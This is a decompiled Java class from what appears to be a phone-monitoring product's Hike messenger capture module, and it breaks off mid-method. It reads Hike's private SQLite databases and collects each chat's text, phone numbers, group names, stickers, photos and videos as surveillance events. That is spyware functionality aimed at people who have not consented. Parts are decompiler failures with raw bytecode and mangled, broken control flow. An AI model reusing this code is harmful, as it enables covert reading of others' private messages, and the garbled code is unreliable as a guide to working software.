package com.vvt.capture.hike;

import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.os.SystemClock;
import com.vvt.events.FxEventDirection;
import com.vvt.events.FxIMAccountEvent;
import com.vvt.events.FxIMContactEvent;
import com.vvt.events.FxIMConversationEvent;
import com.vvt.events.FxIMMessageEvent;
import com.vvt.events.FxIMMessageServiceType;
import com.vvt.im.events.ImMediaFileType;
import com.vvt.im.events.ImType;
import com.vvt.im.events.MessageType;
import com.vvt.im.events.info.f;
import java.io.File;
import java.io.IOException;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.Iterator;
import java.util.List;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

public class b
{
  private static final String a = b.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.e;
  private static final boolean d = com.vvt.ak.a.b;
  
  private static int a(SQLiteDatabase paramSQLiteDatabase, Cursor paramCursor, String paramString1, String paramString2)
  {
    int i = 5;
    int j = 4;
    int k = 3;
    int m = 2;
    int i1 = 1;
    boolean bool1 = b;
    if (bool1) {}
    int i2 = paramCursor.getColumnIndex("hikeFileType");
    String str = paramCursor.getString(i2);
    boolean bool2 = com.vvt.ag.b.a(str);
    int n;
    if (bool2)
    {
      i1 = 0;
      n = a(paramSQLiteDatabase, paramCursor);
      if (n != 0) {
        i1 = 99;
      }
    }
    for (;;)
    {
      n = b;
      if (n != 0) {}
      return i1;
      i2 = Integer.parseInt(str);
      if (i2 != i1) {
        if (i2 == n)
        {
          i1 = n;
        }
        else if (i2 == k)
        {
          i1 = k;
        }
        else if (i2 == j)
        {
          i1 = j;
        }
        else if (i2 == i)
        {
          i1 = i;
        }
        else
        {
          i1 = 6;
          if (i2 == i1)
          {
            i1 = 6;
          }
          else
          {
            i1 = 7;
            if (i2 == i1) {
              i1 = 7;
            } else {
              i1 = -1;
            }
          }
        }
      }
    }
  }
  
  public static long a()
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = false;
    long l = a(null);
    boolean bool2 = b;
    if (bool2) {}
    bool2 = b;
    if (bool2) {}
    return l;
  }
  
  /* Error */
  public static long a(int paramInt, String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_2
    //   3: dconst_0
    //   4: dconst_0
    //   5: ddiv
    //   6: dstore 4
    //   8: aconst_null
    //   9: astore 6
    //   11: aload_1
    //   12: invokestatic 58	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   15: istore 7
    //   17: iload 7
    //   19: ifeq +7 -> 26
    //   22: invokestatic 76	com/vvt/capture/hike/MyUncaughtExceptionHandler:a	()Ljava/lang/String;
    //   25: astore_1
    //   26: aload_1
    //   27: invokestatic 58	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   30: istore 7
    //   32: iload 7
    //   34: ifne +309 -> 343
    //   37: aload_1
    //   38: invokestatic 81	com/vvt/capture/hike/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   41: astore 8
    //   43: aload 8
    //   45: ifnull +289 -> 334
    //   48: iconst_m1
    //   49: istore 9
    //   51: iload_0
    //   52: iload 9
    //   54: if_icmpeq +280 -> 334
    //   57: ldc 85
    //   59: astore 10
    //   61: iconst_0
    //   62: istore 11
    //   64: aconst_null
    //   65: astore 12
    //   67: aconst_null
    //   68: astore 13
    //   70: iconst_0
    //   71: istore 14
    //   73: ldc 83
    //   75: astore 15
    //   77: iload_0
    //   78: invokestatic 88	java/lang/Integer:toString	(I)Ljava/lang/String;
    //   81: astore 16
    //   83: aload 8
    //   85: aload 10
    //   87: aconst_null
    //   88: aconst_null
    //   89: aconst_null
    //   90: aconst_null
    //   91: aconst_null
    //   92: aload 15
    //   94: aload 16
    //   96: invokevirtual 94	android/database/sqlite/SQLiteDatabase:query	(Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   99: astore 10
    //   101: aload 10
    //   103: ifnull +221 -> 324
    //   106: aload 10
    //   108: invokeinterface 98 1 0
    //   113: istore 11
    //   115: iload 11
    //   117: ifeq +81 -> 198
    //   120: ldc 100
    //   122: astore 12
    //   124: aload 10
    //   126: aload 12
    //   128: invokeinterface 49 2 0
    //   133: istore 11
    //   135: aload 10
    //   137: iload 11
    //   139: invokeinterface 53 2 0
    //   144: astore 12
    //   146: aload 12
    //   148: invokestatic 105	java/lang/Long:parseLong	(Ljava/lang/String;)J
    //   151: lstore_2
    //   152: aload 10
    //   154: astore 13
    //   156: lload_2
    //   157: lstore 17
    //   159: getstatic 24	com/vvt/capture/hike/removeFromPath:removeFromPath	Z
    //   162: istore 14
    //   164: iload 14
    //   166: ifeq +3 -> 169
    //   169: aload 13
    //   171: ifnull +10 -> 181
    //   174: aload 13
    //   176: invokeinterface 108 1 0
    //   181: aload 8
    //   183: ifnull +8 -> 191
    //   186: aload 8
    //   188: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   191: lload 17
    //   193: lstore 19
    //   195: lload 19
    //   197: lreturn
    //   198: lconst_0
    //   199: lstore_2
    //   200: dconst_0
    //   201: dstore 4
    //   203: aload 10
    //   205: astore 13
    //   207: lload_2
    //   208: lstore 17
    //   210: goto -51 -> 159
    //   213: astore 10
    //   215: aconst_null
    //   216: astore 13
    //   218: iconst_m1
    //   219: i2l
    //   220: lstore 17
    //   222: getstatic 29	com/vvt/capture/hike/removeFromPath:MyUncaughtExceptionHandler	Z
    //   225: istore 14
    //   227: iload 14
    //   229: ifeq +3 -> 232
    //   232: aload 13
    //   234: ifnull +10 -> 244
    //   237: aload 13
    //   239: invokeinterface 108 1 0
    //   244: aload 8
    //   246: ifnull +8 -> 254
    //   249: aload 8
    //   251: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   254: lload 17
    //   256: lstore 19
    //   258: goto -63 -> 195
    //   261: astore 10
    //   263: aload 6
    //   265: ifnull +10 -> 275
    //   268: aload 6
    //   270: invokeinterface 108 1 0
    //   275: aload 8
    //   277: ifnull +8 -> 285
    //   280: aload 8
    //   282: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   285: aload 10
    //   287: athrow
    //   288: astore 12
    //   290: aload 10
    //   292: astore 6
    //   294: aload 12
    //   296: astore 10
    //   298: goto -35 -> 263
    //   301: astore 10
    //   303: aload 13
    //   305: astore 6
    //   307: goto -44 -> 263
    //   310: astore 12
    //   312: aload 10
    //   314: astore 13
    //   316: goto -98 -> 218
    //   319: astore 10
    //   321: goto -103 -> 218
    //   324: aload 10
    //   326: astore 13
    //   328: lload_2
    //   329: lstore 17
    //   331: goto -172 -> 159
    //   334: aconst_null
    //   335: astore 13
    //   337: lload_2
    //   338: lstore 17
    //   340: goto -181 -> 159
    //   343: lload_2
    //   344: lstore 19
    //   346: goto -151 -> 195
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	349	0	paramInt	int
    //   0	349	1	paramString	String
    //   2	342	2	l1	long
    //   6	196	4	d1	double
    //   9	297	6	localObject1	Object
    //   15	18	7	bool1	boolean
    //   41	240	8	localSQLiteDatabase	SQLiteDatabase
    //   49	6	9	i	int
    //   59	145	10	localObject2	Object
    //   213	1	10	localException1	Exception
    //   261	30	10	localObject3	Object
    //   296	1	10	localObject4	Object
    //   301	12	10	localObject5	Object
    //   319	6	10	localException2	Exception
    //   62	54	11	bool2	boolean
    //   133	5	11	j	int
    //   65	82	12	str1	String
    //   288	7	12	localObject6	Object
    //   310	1	12	localException3	Exception
    //   68	268	13	localObject7	Object
    //   71	157	14	bool3	boolean
    //   75	18	15	str2	String
    //   81	14	16	str3	String
    //   157	182	17	l2	long
    //   193	152	19	l3	long
    // Exception table:
    //   from	to	target	type
    //   77	81	213	java/lang/Exception
    //   94	99	213	java/lang/Exception
    //   77	81	261	finally
    //   94	99	261	finally
    //   106	113	288	finally
    //   126	133	288	finally
    //   137	144	288	finally
    //   146	151	288	finally
    //   159	162	301	finally
    //   222	225	301	finally
    //   106	113	310	java/lang/Exception
    //   126	133	310	java/lang/Exception
    //   137	144	310	java/lang/Exception
    //   146	151	310	java/lang/Exception
    //   159	162	319	java/lang/Exception
  }
  
  /* Error */
  public static long a(String paramString)
  {
    // Byte code:
    //   0: iconst_m1
    //   1: i2l
    //   2: lstore_1
    //   3: iconst_0
    //   4: istore_3
    //   5: aconst_null
    //   6: astore 4
    //   8: getstatic 24	com/vvt/capture/hike/removeFromPath:removeFromPath	Z
    //   11: istore 5
    //   13: iload 5
    //   15: ifeq +3 -> 18
    //   18: getstatic 24	com/vvt/capture/hike/removeFromPath:removeFromPath	Z
    //   21: istore 5
    //   23: iload 5
    //   25: ifeq +3 -> 28
    //   28: aload_0
    //   29: invokestatic 58	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   32: istore 5
    //   34: iload 5
    //   36: ifeq +7 -> 43
    //   39: invokestatic 76	com/vvt/capture/hike/MyUncaughtExceptionHandler:a	()Ljava/lang/String;
    //   42: astore_0
    //   43: aload_0
    //   44: invokestatic 58	com/vvt/ag/removeFromPath:a	(Ljava/lang/String;)Z
    //   47: istore 5
    //   49: iload 5
    //   51: ifne +206 -> 257
    //   54: aload_0
    //   55: invokestatic 81	com/vvt/capture/hike/a/a:a	(Ljava/lang/String;)Landroid/database/sqlite/SQLiteDatabase;
    //   58: astore 6
    //   60: aload 6
    //   62: ifnull +69 -> 131
    //   65: invokestatic 113	com/vvt/capture/hike/removeFromPath:MyUncaughtExceptionHandler	()Ljava/lang/String;
    //   68: astore 7
    //   70: aload 6
    //   72: aload 7
    //   74: aconst_null
    //   75: invokevirtual 117	android/database/sqlite/SQLiteDatabase:rawQuery	(Ljava/lang/String;[Ljava/lang/String;)Landroid/database/Cursor;
    //   78: astore 4
    //   80: aload 4
    //   82: ifnull +49 -> 131
    //   85: aload 4
    //   87: invokeinterface 120 1 0
    //   92: istore 8
    //   94: iload 8
    //   96: ifeq +75 -> 171
    //   99: ldc 100
    //   101: astore 7
    //   103: aload 4
    //   105: aload 7
    //   107: invokeinterface 49 2 0
    //   112: istore 8
    //   114: aload 4
    //   116: iload 8
    //   118: invokeinterface 53 2 0
    //   123: astore 7
    //   125: aload 7
    //   127: invokestatic 105	java/lang/Long:parseLong	(Ljava/lang/String;)J
    //   130: lstore_1
    //   131: aload 4
    //   133: ifnull +10 -> 143
    //   136: aload 4
    //   138: invokeinterface 108 1 0
    //   143: aload 6
    //   145: ifnull +8 -> 153
    //   148: aload 6
    //   150: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   153: getstatic 24	com/vvt/capture/hike/removeFromPath:removeFromPath	Z
    //   156: istore_3
    //   157: iload_3
    //   158: ifeq +3 -> 161
    //   161: getstatic 24	com/vvt/capture/hike/removeFromPath:removeFromPath	Z
    //   164: istore_3
    //   165: iload_3
    //   166: ifeq +3 -> 169
    //   169: lload_1
    //   170: lreturn
    //   171: lconst_0
    //   172: lstore_1
    //   173: goto -42 -> 131
    //   176: astore 6
    //   178: iconst_0
    //   179: istore 5
    //   181: aconst_null
    //   182: astore 6
    //   184: getstatic 29	com/vvt/capture/hike/removeFromPath:MyUncaughtExceptionHandler	Z
    //   187: istore 8
    //   189: iload 8
    //   191: ifeq +3 -> 194
    //   194: aload 4
    //   196: ifnull +10 -> 206
    //   199: aload 4
    //   201: invokeinterface 108 1 0
    //   206: aload 6
    //   208: ifnull -55 -> 153
    //   211: goto -63 -> 148
    //   214: astore 9
    //   216: iconst_0
    //   217: istore 5
    //   219: aconst_null
    //   220: astore 6
    //   222: aload 4
    //   224: ifnull +10 -> 234
    //   227: aload 4
    //   229: invokeinterface 108 1 0
    //   234: aload 6
    //   236: ifnull +8 -> 244
    //   239: aload 6
    //   241: invokevirtual 109	android/database/sqlite/SQLiteDatabase:close	()V
    //   244: aload 9
    //   246: athrow
    //   247: astore 9
    //   249: goto -27 -> 222
    //   252: astore 7
    //   254: goto -70 -> 184
    //   257: iconst_0
    //   258: istore 5
    //   260: aconst_null
    //   261: astore 6
    //   263: goto -132 -> 131
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	266	0	paramString	String
    //   2	171	1	l	long
    //   4	162	3	bool1	boolean
    //   6	222	4	localCursor	Cursor
    //   11	248	5	bool2	boolean
    //   58	91	6	localSQLiteDatabase	SQLiteDatabase
    //   176	1	6	localException1	Exception
    //   182	80	6	localObject1	Object
    //   68	58	7	str	String
    //   252	1	7	localException2	Exception
    //   92	3	8	bool3	boolean
    //   112	5	8	i	int
    //   187	3	8	bool4	boolean
    //   214	31	9	localObject2	Object
    //   247	1	9	localObject3	Object
    // Exception table:
    //   from	to	target	type
    //   28	32	176	java/lang/Exception
    //   39	42	176	java/lang/Exception
    //   43	47	176	java/lang/Exception
    //   54	58	176	java/lang/Exception
    //   28	32	214	finally
    //   39	42	214	finally
    //   43	47	214	finally
    //   54	58	214	finally
    //   65	68	247	finally
    //   74	78	247	finally
    //   85	92	247	finally
    //   105	112	247	finally
    //   116	123	247	finally
    //   125	130	247	finally
    //   184	187	247	finally
    //   65	68	252	java/lang/Exception
    //   74	78	252	java/lang/Exception
    //   85	92	252	java/lang/Exception
    //   105	112	252	java/lang/Exception
    //   116	123	252	java/lang/Exception
    //   125	130	252	java/lang/Exception
  }
  
  private static com.vvt.im.events.info.a a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2, String paramString3, boolean paramBoolean)
  {
    byte[] arrayOfByte = null;
    int i = b;
    if (i != 0) {}
    String str = "image/png";
    Object localObject1 = a(paramSQLiteDatabase, paramString1);
    if (paramBoolean)
    {
      localObject2 = localObject1;
      i = 0;
      localObject1 = null;
      for (;;)
      {
        boolean bool2 = com.vvt.ag.b.a((String)localObject2);
        if (!bool2) {
          break;
        }
        int k = 10;
        if (i >= k) {
          break;
        }
        boolean bool3 = b;
        if (bool3) {}
        long l = 6000L;
        SystemClock.sleep(l);
        localObject2 = a(paramSQLiteDatabase, paramString1);
        int j;
        i += 1;
      }
    }
    Object localObject2 = localObject1;
    localObject1 = ImType.HIKE;
    Object localObject3 = ImMediaFileType.ATTACHMENT;
    localObject1 = c.a(paramString2, (String)localObject2, (ImType)localObject1, (ImMediaFileType)localObject3, paramString3);
    localObject2 = new com/vvt/im/events/info/a;
    ((com.vvt.im.events.info.a)localObject2).<init>();
    ((com.vvt.im.events.info.a)localObject2).a(null);
    localObject3 = new byte[0];
    ((com.vvt.im.events.info.a)localObject2).a((byte[])localObject3);
    ((com.vvt.im.events.info.a)localObject2).c(null);
    arrayOfByte = new byte[0];
    ((com.vvt.im.events.info.a)localObject2).b(arrayOfByte);
    ((com.vvt.im.events.info.a)localObject2).d((String)localObject1);
    ((com.vvt.im.events.info.a)localObject2).b(str);
    boolean bool1 = b;
    if (bool1) {}
    return (com.vvt.im.events.info.a)localObject2;
  }
  
  private static com.vvt.im.events.info.a a(String paramString, int paramInt, boolean paramBoolean, HikeData.Direction paramDirection)
  {
    boolean bool1 = b;
    if (bool1) {}
    String str1 = "";
    localObject1 = "";
    str2 = "";
    bool1 = false;
    String str3 = null;
    Object localObject2 = "fp";
    localObject4 = "fn";
    Object localObject5 = "ct";
    try
    {
      Object localObject6 = new org/json/JSONObject;
      ((JSONObject)localObject6).<init>(paramString);
      String str4 = "files";
      localObject6 = ((JSONObject)localObject6).getJSONArray(str4);
      boolean bool2 = false;
      str4 = null;
      localObject6 = ((JSONArray)localObject6).getJSONObject(0);
      bool2 = ((JSONObject)localObject6).has((String)localObject2);
      if (bool2) {
        localObject1 = ((JSONObject)localObject6).getString((String)localObject2);
      }
      bool3 = ((JSONObject)localObject6).has((String)localObject4);
      if (bool3) {
        str1 = ((JSONObject)localObject6).getString((String)localObject4);
      }
      bool3 = ((JSONObject)localObject6).has((String)localObject5);
      if (bool3) {
        str3 = ((JSONObject)localObject6).getString((String)localObject5);
      }
    }
    catch (JSONException localJSONException)
    {
      for (;;)
      {
        int i;
        int j;
        boolean bool3 = b;
        if (bool3)
        {
          continue;
          localObject1 = str2;
          continue;
          Object localObject3 = localObject4;
        }
      }
    }
    bool3 = com.vvt.ag.b.a((String)localObject1);
    if (bool3) {
      localObject1 = c.c(str1);
    }
    localObject2 = new java/io/File;
    ((File)localObject2).<init>((String)localObject1);
    localObject4 = localObject1;
    i = 0;
    localObject1 = null;
    do
    {
      boolean bool4 = ((File)localObject2).exists();
      if ((bool4) || (!paramBoolean)) {
        break;
      }
      bool4 = b;
      if (bool4) {}
      long l = 6000L;
      SystemClock.sleep(l);
      localObject5 = HikeData.Direction.IN;
      if (paramDirection == localObject5)
      {
        localObject5 = c.c(str1);
        boolean bool5 = com.vvt.ag.b.a((String)localObject5);
        if (!bool5)
        {
          localObject2 = new java/io/File;
          ((File)localObject2).<init>((String)localObject5);
          localObject4 = localObject5;
        }
      }
      i += 1;
      j = 10;
    } while (i != j);
    localObject2 = localObject4;
    i = 1;
    if (paramInt == i)
    {
      localObject1 = localObject2;
      localObject4 = new com/vvt/im/events/info/a;
      ((com.vvt.im.events.info.a)localObject4).<init>();
      ((com.vvt.im.events.info.a)localObject4).a(str1);
      ((com.vvt.im.events.info.a)localObject4).c((String)localObject2);
      ((com.vvt.im.events.info.a)localObject4).d((String)localObject1);
      localObject1 = new byte[0];
      ((com.vvt.im.events.info.a)localObject4).b((byte[])localObject1);
      ((com.vvt.im.events.info.a)localObject4).b(str3);
      bool1 = b;
      if (bool1) {}
      return (com.vvt.im.events.info.a)localObject4;
    }
  }
  
  private static com.vvt.im.events.info.b a(SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, String paramString, Cursor paramCursor)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = "msisdn";
    int i = paramCursor.getColumnIndex((String)localObject1);
    String str = paramCursor.getString(i);
    boolean bool2 = c(paramCursor);
    boolean bool4 = b;
    int j;
    if ((!bool4) || (bool2)) {
      j = paramCursor.getColumnIndex("groupName");
    }
    for (localObject1 = paramCursor.getString(j);; localObject1 = c(paramSQLiteDatabase2, str))
    {
      bool4 = com.vvt.ag.b.a((String)localObject1);
      if (bool4)
      {
        bool3 = d;
        if (bool3) {}
        localObject1 = str;
      }
      Object localObject2 = ImMediaFileType.CONVERSATION_PROFILE;
      localObject2 = a(str, paramString, (ImMediaFileType)localObject2);
      com.vvt.im.events.info.b localb = new com/vvt/im/events/info/b;
      localb.<init>();
      localb.a(str);
      localb.b((String)localObject1);
      localb.c((String)localObject2);
      boolean bool3 = b;
      if (bool3) {}
      return localb;
    }
  }
  
  private static String a(Cursor paramCursor)
  {
    boolean bool1 = b;
    if (bool1) {}
    int i = paramCursor.getColumnIndex("metadata");
    String str = paramCursor.getString(i);
    boolean bool2 = b;
    if (bool2) {}
    return str;
  }
  
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString)
  {
    boolean bool1 = b;
    if (bool1) {}
    String str1 = "";
    Object localObject = "stId";
    bool2 = paramString.contains((CharSequence)localObject);
    if (bool2) {}
    try
    {
      localObject = new org/json/JSONObject;
      ((JSONObject)localObject).<init>(paramString);
      String str2 = "stId";
      str2 = ((JSONObject)localObject).getString(str2);
      String str3 = "catId";
      localObject = ((JSONObject)localObject).getString(str3);
      str1 = a(paramSQLiteDatabase, (String)localObject, str2);
    }
    catch (JSONException localJSONException)
    {
      for (;;)
      {
        bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = b;
    if (bool2) {}
    return str1;
  }
  
  private static String a(SQLiteDatabase paramSQLiteDatabase, String paramString1, String paramString2)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    Object localObject1 = "";
    Object localObject2 = "";
    Object localObject3 = "";
    Object localObject4 = new String[2];
    localObject4[0] = paramString1;
    int j = 1;
    localObject4[j] = paramString2;
    Object localObject5 = paramSQLiteDatabase.rawQuery("SELECT *  FROM sticker_table WHERE categoryId = ?  AND st_id = ? ", (String[])localObject4);
    boolean bool3 = b;
    if (bool3) {}
    bool3 = b;
    if (bool3) {}
    bool3 = b;
    boolean bool5;
    label233:
    boolean bool7;
    if ((!bool3) || (localObject5 != null))
    {
      int k = ((Cursor)localObject5).getCount();
      if (k > 0)
      {
        boolean bool4 = ((Cursor)localObject5).moveToFirst();
        if (bool4)
        {
          int i = ((Cursor)localObject5).getColumnIndex("lr_st_path");
          localObject2 = ((Cursor)localObject5).getString(i);
          i = ((Cursor)localObject5).getColumnIndex("sm_st_path");
          localObject3 = ((Cursor)localObject5).getString(i);
          bool5 = com.vvt.ag.b.a((String)localObject3);
          if (bool5)
          {
            bool5 = com.vvt.ag.b.a((String)localObject2);
            if (bool5) {
              break label328;
            }
          }
          localObject5 = new java/io/File;
          ((File)localObject5).<init>((String)localObject3);
          localObject4 = new java/io/File;
          ((File)localObject4).<init>((String)localObject2);
          bool4 = ((File)localObject4).exists();
          if (!bool4) {
            break label296;
          }
          boolean bool6 = b;
          if (bool6) {}
          bool6 = ((File)localObject5).exists();
          if (!bool6) {
            break label313;
          }
          bool7 = b;
          if (bool7) {}
          label255:
          localObject1 = localObject3;
        }
      }
    }
    for (;;)
    {
      boolean bool2 = b;
      if (bool2) {}
      return (String)localObject1;
      bool5 = b;
      if (!bool5) {
        break;
      }
      break;
      bool5 = b;
      if (!bool5) {
        break;
      }
      break;
      label296:
      bool7 = b;
      if (bool7) {}
      localObject2 = localObject1;
      break label233;
      label313:
      bool2 = b;
      if (bool2) {}
      localObject3 = localObject2;
      break label255;
      label328:
      bool2 = b;
      if (!bool2) {}
    }
  }
  
  private static String a(String paramString1, String paramString2, ImMediaFileType paramImMediaFileType)
  {
    boolean bool1 = b;
    if (bool1) {}
    Object localObject1 = c.b(paramString1);
    bool2 = com.vvt.ag.b.a((String)localObject1);
    if (bool2) {
      localObject1 = b(paramString1, paramString2, paramImMediaFileType);
    }
    bool2 = ((String)localObject1).isEmpty();
    if (!bool2) {}
    try
    {
      Object localObject2 = ImType.HIKE;
      localObject2 = com.vvt.im.a.c.a(paramString2, (ImType)localObject2, paramImMediaFileType);
      String str = com.vvt.im.a.c.a(paramImMediaFileType);
      Object localObject3 = new java/lang/StringBuilder;
      ((StringBuilder)localObject3).<init>();
      localObject2 = ((StringBuilder)localObject3).append((String)localObject2);
      localObject3 = File.separator;
      localObject2 = ((StringBuilder)localObject2).append((String)localObject3);
      localObject2 = ((StringBuilder)localObject2).append(str);
      localObject2 = ((StringBuilder)localObject2).toString();
      com.vvt.io.d.a((String)localObject1, (String)localObject2);
      localObject1 = localObject2;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        bool2 = c;
        if (!bool2) {}
      }
    }
    bool2 = b;
    if (bool2) {}
    return (String)localObject1;
  }
  
  private static ArrayList a(SQLiteDatabase paramSQLiteDatabase1, SQLiteDatabase paramSQLiteDatabase2, String paramString, Cursor paramCursor, com.vvt.base.b paramb, boolean paramBoolean)
  {
    boolean bool1 = b;
    if (bool1) {}
    bool1 = b;
    if (bool1) {}
    ArrayList localArrayList1 = new java/util/ArrayList;
    localArrayList1.<init>();
    boolean bool4 = false;
    localObject1 = null;
    Object localObject2 = MessageType.Text;
    int i = ((MessageType)localObject2).getNumber();
    try
    {
      boolean bool5 = paramCursor.moveToLast();
      if (!bool5) {
        break label425;
      }
      bool5 = b;
      if (bool5) {}
      bool5 = b;
      if (!bool5) {}
    }
    catch (Exception localException)
    {
      for (;;)
      {
        com.vvt.im.events.info.d locald;
        Object localObject3;
        f localf;
        com.vvt.im.events.info.b localb;
        ArrayList localArrayList2;
        HikeData.Direction localDirection;
        int k;
        ArrayList localArrayList3;
        String str;
        int n;
        long l1;
        long l2;
        boolean bool6;
        boolean bool7;
        int i1;
        Object localObject4;
        boolean bool3 = c;
        if (bool3)
        {
          continue;
          localObject4 = localObject3;
          localObject3 = localObject1;
          localObject1 = localObject4;
          continue;
          localObject1 = localObject3;
        }
      }
    }
    locald = d(paramSQLiteDatabase1, paramString);
    localObject3 = new com/vvt/im/events/info/f;
    ((f)localObject3).<init>();
    localObject3 = locald.b();
    localf = b(paramSQLiteDatabase2, paramCursor, paramString, (String)localObject3);
    localObject3 = new com/vvt/im/events/info/b;
    ((com.vvt.im.events.info.b)localObject3).<init>();
    localb = a(paramSQLiteDatabase1, paramSQLiteDatabase2, paramString, paramCursor);
    localObject3 = new java/util/ArrayList;
    ((ArrayList)localObject3).<init>();
    localArrayList2 = b(paramSQLiteDatabase1, paramSQLiteDatabase2, paramString, paramCursor);
    localDirection = b(paramCursor);
    localObject3 = paramb.f();
    k = a(paramSQLiteDatabase1, paramCursor, paramString, (String)localObject3);
    localArrayList3 = new java/util/ArrayList;
    localArrayList3.<init>();
    localObject3 = new com/vvt/im/events/info/c;
    ((com.vvt.im.events.info.c)localObject3).<init>();
    str = "timestamp";
    n = paramCursor.getColumnIndex(str);
    l1 = paramCursor.getLong(n);
    l2 = 1000L;
    l1 *= l2;
    bool6 = c(paramCursor);
    bool7 = b;
    if (bool7) {}
    i1 = -1;
    if (k == i1)
    {
      localObject2 = "message";
      i = paramCursor.getColumnIndex((String)localObject2);
      localObject1 = paramCursor.getString(i);
      localObject2 = MessageType.Text;
      i = ((MessageType)localObject2).getNumber();
      localObject4 = localObject3;
      localObject3 = localObject1;
      localObject1 = localObject4;
    }
    for (;;)
    {
      Object localObject5 = new com/vvt/capture/hike/HikeData;
      ((HikeData)localObject5).<init>();
      ((HikeData)localObject5).a(locald);
      ((HikeData)localObject5).a(localf);
      ((HikeData)localObject5).a(localb);
      ((HikeData)localObject5).a(localArrayList2);
      ((HikeData)localObject5).a(localDirection);
      ((HikeData)localObject5).a(l1);
      ((HikeData)localObject5).a((String)localObject3);
      ((HikeData)localObject5).a((com.vvt.im.events.info.c)localObject1);
      ((HikeData)localObject5).b(localArrayList3);
      ((HikeData)localObject5).a(i);
      ((HikeData)localObject5).a(bool6);
      localArrayList1.add(localObject5);
      bool4 = b;
      if (bool4) {}
      bool4 = paramCursor.moveToPrevious();
      if (bool4) {
        break label1575;
      }
      label425:
      boolean bool2 = b;
      if (bool2) {}
      return localArrayList1;
      int j;
      if (k == 0)
      {
        localObject2 = "message";
        j = paramCursor.getColumnIndex((String)localObject2);
        localObject1 = paramCursor.getString(j);
        localObject2 = MessageType.Text;
        j = ((MessageType)localObject2).getNumber();
        localObject4 = localObject3;
        localObject3 = localObject1;
        localObject1 = localObject4;
      }
      else
      {
        i1 = 99;
        int m;
        if (k == i1)
        {
          localObject2 = "message";
          j = paramCursor.getColumnIndex((String)localObject2);
          localObject1 = paramCursor.getString(j);
          localObject2 = MessageType.Sticker;
          j = ((MessageType)localObject2).getNumber();
          localObject5 = a(paramCursor);
          Object localObject6 = paramb.f();
          localObject5 = a(paramSQLiteDatabase1, (String)localObject5, paramString, (String)localObject6, paramBoolean);
          localArrayList3.add(localObject5);
          localObject6 = ((com.vvt.im.events.info.a)localObject5).f();
          i2 = com.vvt.ag.b.a((String)localObject6);
          if (i2 == 0)
          {
            localObject6 = new java/io/File;
            localObject5 = ((com.vvt.im.events.info.a)localObject5).f();
            ((File)localObject6).<init>((String)localObject5);
            m = ((File)localObject6).exists();
            if (m == 0)
            {
              localObject2 = MessageType.Text;
              j = ((MessageType)localObject2).getNumber();
              localObject1 = HikeData.Direction.OUT;
              if (localDirection != localObject1) {
                break label671;
              }
              localObject1 = "[You sent sticker]";
            }
          }
          for (;;)
          {
            localObject4 = localObject3;
            localObject3 = localObject1;
            localObject1 = localObject4;
            break;
            label671:
            localObject1 = "[You received sticker]";
            continue;
            localObject2 = MessageType.Text;
            j = ((MessageType)localObject2).getNumber();
            localObject1 = HikeData.Direction.OUT;
            if (localDirection == localObject1) {
              localObject1 = "[You sent sticker]";
            } else {
              localObject1 = "[You received sticker]";
            }
          }
        }
        int i2 = 1;
        if (m == i2)
        {
          localObject2 = "message";
          j = paramCursor.getColumnIndex((String)localObject2);
          localObject1 = paramCursor.getString(j);
          localObject2 = MessageType.none;
          j = ((MessageType)localObject2).getNumber();
          localObject5 = a(paramCursor);
          i2 = 1;
          localObject5 = a((String)localObject5, i2, paramBoolean, localDirection);
          localArrayList3.add(localObject5);
          m = c.a((com.vvt.im.events.info.a)localObject5);
          if (m == 0)
          {
            localObject2 = MessageType.Text;
            j = ((MessageType)localObject2).getNumber();
            localObject1 = HikeData.Direction.OUT;
            if (localDirection != localObject1) {
              break label852;
            }
          }
          label852:
          for (localObject1 = "[You sent a photo]";; localObject1 = "[You received a photo]")
          {
            localObject4 = localObject3;
            localObject3 = localObject1;
            localObject1 = localObject4;
            break;
          }
        }
        int i3 = 2;
        if (m == i3)
        {
          localObject2 = "message";
          j = paramCursor.getColumnIndex((String)localObject2);
          localObject1 = paramCursor.getString(j);
          localObject2 = MessageType.none;
          j = ((MessageType)localObject2).getNumber();
          localObject5 = a(paramCursor);
          i4 = 2;
          localObject5 = a((String)localObject5, i4, paramBoolean, localDirection);
          localArrayList3.add(localObject5);
          m = c.a((com.vvt.im.events.info.a)localObject5);
          if (m == 0)
          {
            localObject2 = MessageType.Text;
            j = ((MessageType)localObject2).getNumber();
            localObject1 = HikeData.Direction.OUT;
            if (localDirection != localObject1) {
              break label993;
            }
          }
          label993:
          for (localObject1 = "[You sent a video]";; localObject1 = "[You received a video]")
          {
            localObject4 = localObject3;
            localObject3 = localObject1;
            localObject1 = localObject4;
            break;
          }
        }
        int i4 = 3;
        if (m == i4)
        {
          localObject2 = "message";
          j = paramCursor.getColumnIndex((String)localObject2);
          localObject1 = paramCursor.getString(j);
          localObject2 = MessageType.none;
          j = ((MessageType)localObject2).getNumber();
